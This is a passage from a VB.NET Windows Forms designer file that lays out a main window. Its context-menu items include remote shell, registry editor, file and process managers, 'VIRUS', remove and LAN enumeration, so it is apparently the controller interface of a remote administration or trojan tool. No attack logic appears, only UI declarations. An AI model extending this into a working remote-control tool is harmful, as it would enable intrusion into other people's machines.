        Me.Lv1.View = System.Windows.Forms.View.List
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(923, 295)
        Me.Controls.Add(Me.L1)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.Lv1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.Text = "Main2"
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel3 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusLabel2 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RegeditToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CmdShellToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FileManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MsgBoxToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AboutToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents VIRUSToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoveToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ii As System.Windows.Forms.ImageList
    Friend WithEvents Timer2 As System.Windows.Forms.Timer
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents L1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader4 As System.Windows.Forms.ColumnHeader
    Friend WithEvents Lv1 As System.Windows.Forms.ListView
    Friend WithEvents ColumnHeader10 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader11 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader12 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader13 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader14 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader15 As System.Windows.Forms.ColumnHeader
    Friend WithEvents LANEnumeriationToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
End Class
